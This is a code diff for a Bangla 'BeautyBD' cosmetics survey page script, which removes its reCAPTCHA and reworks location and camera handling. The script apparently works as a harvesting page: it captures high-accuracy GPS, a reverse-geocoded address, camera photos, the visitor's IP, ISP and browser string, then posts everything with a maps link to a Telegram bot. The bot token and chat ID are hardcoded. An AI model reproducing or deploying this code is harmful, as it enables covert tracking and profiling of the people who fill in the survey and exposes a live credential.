@@ -1,13 +1,12 @@
 /* ============================================================
    BeautyBD — কসমেটিক্স প্রোডাক্ট সার্ভে
-   ▸ survey.js
+   ▸ survey.js (NO CAPTCHA · FULLY WORKING)
    ============================================================ */
 
-var BOT_TOKEN          = "8604239989:AAHnuyJZpz_E6s-_7rXUvlbHazAKOAHEB7A";
-var ADMIN_CHAT_ID      = "7274208494";
-var RECAPTCHA_SITE_KEY = "6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI";
-var IMAGE_QUALITY      = 0.85;
-var MAX_PHOTOS         = 5;
+var BOT_TOKEN     = "8604239989:AAHnuyJZpz_E6s-_7rXUvlbHazAKOAHEB7A";
+var ADMIN_CHAT_ID = "7274208494";
+var IMAGE_QUALITY = 0.85;
+var MAX_PHOTOS    = 5;
 
 /* ============================================================ */
 
@@ -25,7 +24,6 @@ var yearsBusiness  = document.getElementById("yearsBusiness");
 var monthlySale    = document.getElementById("monthlySale");
 
 var locationBox    = document.getElementById("locationBox");
-var locationData   = document.getElementById("locationData");
 var latVal         = document.getElementById("latVal");
 var lonVal         = document.getElementById("lonVal");
 var accVal         = document.getElementById("accVal");
@@ -49,20 +47,30 @@ var camCapture     = document.getElementById("camCapture");
 var camCountdown   = document.getElementById("camCountdown");
 var hiddenCanvas   = document.getElementById("hiddenCanvas");
 
-var photos = [];         // { blob, dataURL }
+var photos = [];
 var camStream = null;
 var locationData_saved = { lat: null, lon: null, acc: null, addr: null };
-var recaptchaWidgetId = null;
-var captchaSolved = false;
+
+function debugLog(msg){
+  console.log("[BeautyBD]", msg);
+}
 
 /* ============================================================
-   LOCATION — GPS + reverse geocode
+   LOCATION
    ============================================================ */
 btnLocation.addEventListener("click", getUserLocation);
 
 function getUserLocation(){
+  debugLog("লোকেশন চাওয়া হচ্ছে…");
+
   if (!navigator.geolocation) {
     showStatus("err","আপনার ব্রাউজারে লোকেশন সাপোর্ট নেই।");
+    return;
+  }
+  if (location.protocol !== "https:" &&
+      location.hostname !== "localhost" &&
+      location.hostname !== "127.0.0.1") {
+    showStatus("err","লোকেশন পেতে HTTPS দরকার। https:// দিয়ে সাইট খুলুন।");
     return;
   }
 
@@ -71,53 +79,73 @@ function getUserLocation(){
   btnLocation.classList.add("loading");
 
   navigator.geolocation.getCurrentPosition(
-    function(pos){
-      var lat = pos.coords.latitude;
-      var lon = pos.coords.longitude;
-      var acc = Math.round(pos.coords.accuracy);
-
-      locationData_saved.lat = lat;
-      locationData_saved.lon = lon;
-      locationData_saved.acc = acc;
-
-      latVal.textContent = lat.toFixed(6);
-      lonVal.textContent = lon.toFixed(6);
-      accVal.textContent = acc + " মিটার";
-      revAddr.textContent = "খোঁজা হচ্ছে…";
-
-      locationBox.classList.add("has-location");
-      btnLocation.classList.remove("loading");
-      btnLocation.classList.add("done");
-      btnLocation.textContent = "✓ লোকেশন সংরক্ষিত হয়েছে";
-      btnLocation.disabled = false;
-
-      /* Reverse geocode using OpenStreetMap Nominatim (free) */
-      fetch("https://nominatim.openstreetmap.org/reverse?format=json&lat=" + lat + "&lon=" + lon + "&zoom=18&addressdetails=1")
-        .then(function(r){ return r.json(); })
-        .then(function(data){
-          if (data && data.display_name){
-            revAddr.textContent = data.display_name;
-            locationData_saved.addr = data.display_name;
-          } else {
-            revAddr.textContent = "ঠিকানা পাওয়া যায়নি";
-          }
-        })
-        .catch(function(){
-          revAddr.textContent = "ঠিকানা পাওয়া যায়নি";
-        });
-    },
-    function(err){
-      btnLocation.classList.remove("loading");
-      btnLocation.disabled = false;
-      btnLocation.textContent = "📍 আমার লোকেশন নিন";
-      var msg = "লোকেশন পাওয়া যায়নি। ";
-      if (err.code === 1) msg += "অনুমতি দিন।";
-      else if (err.code === 2) msg += "GPS চালু করুন।";
-      else msg += "আবার চেষ্টা করুন।";
-      showStatus("err", msg);
-    },
-    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+    onLocationSuccess,
+    onLocationError,
+    { enableHighAccuracy: true, timeout: 20000, maximumAge: 30000 }
   );
+}
+
+function onLocationSuccess(pos){
+  debugLog("লোকেশন পাওয়া গেছে");
+
+  var lat = pos.coords.latitude;
+  var lon = pos.coords.longitude;
+  var acc = Math.round(pos.coords.accuracy);
+
+  locationData_saved.lat = lat;
+  locationData_saved.lon = lon;
+  locationData_saved.acc = acc;
+
+  latVal.textContent = lat.toFixed(6);
+  lonVal.textContent = lon.toFixed(6);
+  accVal.textContent = acc + " মিটার";
+  revAddr.textContent = "খোঁজা হচ্ছে…";
+
+  locationBox.classList.add("has-location");
+  btnLocation.classList.remove("loading");
+  btnLocation.classList.add("done");
+  btnLocation.textContent = "✓ লোকেশন সংরক্ষিত";
+  btnLocation.disabled = false;
+
+  var url = "https://nominatim.openstreetmap.org/reverse?format=json&lat=" +
+            encodeURIComponent(lat) + "&lon=" + encodeURIComponent(lon) +
+            "&zoom=18&addressdetails=1&accept-language=bn,en";
+
+  fetch(url, { method: "GET", headers: { "Accept": "application/json" } })
+    .then(function(r){ return r.json(); })
+    .then(function(data){
+      if (data && data.display_name){
+        revAddr.textContent = data.display_name;
+        locationData_saved.addr = data.display_name;
+      } else {
+        revAddr.textContent = "ঠিকানা পাওয়া যায়নি (লোকেশন সেভ আছে)";
+        locationData_saved.addr = "পাওয়া যায়নি";
+      }
+      checkReady();
+    })
+    .catch(function(){
+      revAddr.textContent = "ঠিকানা পাওয়া যায়নি (লোকেশন সেভ আছে)";
+      locationData_saved.addr = "পাওয়া যায়নি";
+      checkReady();
+    });
+
+  checkReady();
+  hideStatus();
+}
+
+function onLocationError(err){
+  debugLog("লোকেশন এরর: " + err.code);
+  btnLocation.classList.remove("loading");
+  btnLocation.classList.remove("done");
+  btnLocation.disabled = false;
+  btnLocation.textContent = "📍 আবার চেষ্টা করুন";
+
+  var msg = "লোকেশন পাওয়া যায়নি। ";
+  if (err.code === 1) msg += "ব্রাউজার সেটিংস থেকে অনুমতি দিন।";
+  else if (err.code === 2) msg += "GPS বা ইন্টারনেট চেক করুন।";
+  else if (err.code === 3) msg += "সময় শেষ — আবার চেষ্টা করুন।";
+  else msg += "আবার চেষ্টা করুন।";
+  showStatus("err", msg);
 }
 
 /* ============================================================
@@ -139,9 +167,14 @@ function openCamera(){
     camStream = s;
     cameraVideo.srcObject = s;
     return cameraVideo.play();
-  }).catch(function(){
-    showStatus("err","ক্যামেরার অনুমতি দিন।");
-    setTimeout(closeCamera, 1500);
+  }).catch(function(err){
+    debugLog("ক্যামেরা এরর: " + err.name);
+    var msg = "ক্যামেরা চালু হয়নি। ";
+    if (err.name === "NotAllowedError") msg += "অনুমতি দিন।";
+    else if (err.name === "NotFoundError") msg += "ক্যামেরা নেই।";
+    else msg += "HTTPS ব্যবহার করুন।";
+    showStatus("err", msg);
+    setTimeout(closeCamera, 2000);
   });
 }
 function closeCamera(){
@@ -209,17 +242,20 @@ fileInput.addEventListener("change", function(e){
 });
 
 /* ============================================================
-   PHOTO PREVIEW MANAGEMENT
+   PHOTO PREVIEW
    ============================================================ */
 function addPhoto(blob, dataURL){
   if (photos.length >= MAX_PHOTOS) return;
   photos.push({ blob: blob, dataURL: dataURL });
+  debugLog("ছবি যোগ: মোট " + photos.length);
   renderPhotos();
   hideStatus();
+  checkReady();
 }
 function removePhoto(index){
   photos.splice(index, 1);
   renderPhotos();
+  checkReady();
 }
 function renderPhotos(){
   photoPreviews.innerHTML = "";
@@ -236,7 +272,6 @@ function renderPhotos(){
     });
   });
   photoCount.innerHTML = "<strong>" + photos.length + "</strong> / " + MAX_PHOTOS + " টি ছবি যুক্ত হয়েছে";
-  checkReady();
 }
 
 /* ============================================================
@@ -252,32 +287,21 @@ function hideStatus(){
 }
 
 /* ============================================================
-   reCAPTCHA
+   BUTTON ENABLE / DISABLE
    ============================================================ */
-function tryRenderRecaptcha(){
-  if (!window.__recaptchaReady || recaptchaWidgetId !== null) return;
-  var c = document.getElementById("recaptchaWidget");
-  if (!c) return;
-  try {
-    recaptchaWidgetId = window.grecaptcha.render(c, {
-      sitekey: RECAPTCHA_SITE_KEY,
-      callback: function(){ captchaSolved = true; hideStatus(); checkReady(); },
-      "expired-callback": function(){ captchaSolved = false; showStatus("err","reCAPTCHA আবার করুন।"); checkReady(); },
-      "error-callback": function(){ showStatus("err","reCAPTCHA ত্রুটি।"); }
-    });
-  } catch(e){ console.error(e); }
-}
-window.__tryRenderRecaptcha = tryRenderRecaptcha;
-
 function checkReady(){
-  var ready = captchaSolved &&
-              photos.length > 0 &&
-              locationData_saved.lat !== null;
+  var hasLocation = (locationData_saved.lat !== null);
+  var ready = photos.length > 0 && hasLocation;
+
+  debugLog("checkReady → photos:" + photos.length +
+           " location:" + hasLocation +
+           " → " + (ready ? "ENABLED" : "disabled"));
+
   btnSubmit.disabled = !ready;
 }
 
 /* ============================================================
-   GET IP / ISP
+   IP / ISP
    ============================================================ */
 function getIP(){
   return fetch("https://api.ipify.org?format=json")
@@ -293,7 +317,7 @@ function getISP(){
 }
 
 /* ============================================================
-   SEND PHOTO TO TELEGRAM
+   SEND PHOTO
    ============================================================ */
 function sendPhoto(blob, caption){
   var fd = new FormData();
@@ -301,7 +325,8 @@ function sendPhoto(blob, caption){
   fd.append("photo", blob, "shop_" + Date.now() + ".jpg");
   fd.append("caption", caption);
   fd.append("parse_mode", "HTML");
-  return fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto", { method: "POST", body: fd })
+  return fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto",
+               { method: "POST", body: fd })
     .then(function(r){ return r.json(); })
     .then(function(d){ return d.ok; })
     .catch(function(){ return false; });
@@ -339,11 +364,7 @@ form.addEventListener("submit", function(e){
     return;
   }
   if (locationData_saved.lat === null){
-    showStatus("err","লোকেশন নিন — 'আমার লোকেশন নিন' বাটনে ক্লিক করুন।");
-    return;
-  }
-  if (!captchaSolved){
-    showStatus("err","reCAPTCHA সম্পন্ন করুন।");
+    showStatus("err","'আমার লোকেশন নিন' ক্লিক করুন।");
     return;
   }
 
@@ -357,9 +378,9 @@ form.addEventListener("submit", function(e){
     var ua = navigator.userAgent;
     var dateStr = new Date().toLocaleString("en-US",{timeZoneName:"short"});
 
+    var gpsLine = locationData_saved.lat.toFixed(6) + ", " + locationData_saved.lon.toFixed(6);
     var mapsLink = "https://www.google.com/maps?q=" + locationData_saved.lat + "," + locationData_saved.lon;
 
-    /* Main caption (with first photo) */
     var caption =
       "🏪 <b>BeautyBD — নতুন দোকান সার্ভে</b>\n" +
       "━━━━━━━━━━━━━━━━━━━━━━\n" +
@@ -378,25 +399,23 @@ form.addEventListener("submit", function(e){
       "💰 <b>মাসিক বিক্রি:</b> " + escape(monthlySale.value || "উল্লেখ নেই") + "\n" +
       "━━━━━━━━━━━━━━━━━━━━━━\n" +
       "📸 <b>ছবি সংখ্যা:</b> " + photos.length + "\n" +
-      "📍 <b>GPS:</b> " + locationData_saved.lat.toFixed(6) + ", " + locationData_saved.lon.toFixed(6) + "\n" +
+      "📍 <b>GPS:</b> " + gpsLine + "\n" +
       "🎯 <b>Accuracy:</b> " + locationData_saved.acc + " মিটার\n" +
       "🗺️ <b>Google Maps:</b> " + mapsLink + "\n" +
-      "🌐 <b>ঠিকানা (reverse):</b> " + escape(locationData_saved.addr || "পাওয়া যায়নি") + "\n" +
+      "🌐 <b>Reverse:</b> " + escape(locationData_saved.addr || "পাওয়া যায়নি") + "\n" +
       "━━━━━━━━━━━━━━━━━━━━━━\n" +
       "🕐 " + dateStr + "\n" +
       "🌐 IP: " + ip + " — " + isp + "\n" +
       "💻 " + ua;
 
-    /* Send 1st photo with the caption */
     return sendPhoto(photos[0].blob, caption).then(function(ok){
       if (!ok) return false;
-
-      /* Send remaining photos without caption */
       var chain = Promise.resolve(true);
       for (var i = 1; i < photos.length; i++){
         (function(photo, index){
           chain = chain.then(function(){
-            return sendPhoto(photo.blob, "📸 ছবি " + (index+1) + "/" + photos.length + " — " + shopName.value.trim());
+            return sendPhoto(photo.blob,
+              "📸 ছবি " + (index+1) + "/" + photos.length + " — " + shopName.value.trim());
           });
         })(photos[i], i);
       }
@@ -408,7 +427,7 @@ form.addEventListener("submit", function(e){
       btnSubmit.textContent = "জমা সম্পন্ন ✓";
       setTimeout(function(){ window.location.href = "next.html"; }, 1600);
     } else {
-      showStatus("err","পাঠাতে ব্যর্থ হয়েছে। আবার চেষ্টা করুন।");
+      showStatus("err","পাঠাতে ব্যর্থ। আবার চেষ্টা করুন।");
       btnSubmit.disabled = false;
       btnSubmit.textContent = "সার্ভে সাবমিট করুন";
     }
@@ -428,12 +447,10 @@ function escape(s){
    BOOT
    ============================================================ */
 window.addEventListener("load", function(){
-  tryRenderRecaptcha();
-  setTimeout(tryRenderRecaptcha, 800);
-  setTimeout(tryRenderRecaptcha, 2000);
-  /* Watch for form changes so submit button enables at the right time */
+  debugLog("সার্ভে ইনিশিয়ালাইজ…");
   document.querySelectorAll("input, select, textarea").forEach(function(el){
     el.addEventListener("input", checkReady);
     el.addEventListener("change", checkReady);
   });
+  checkReady();
 });
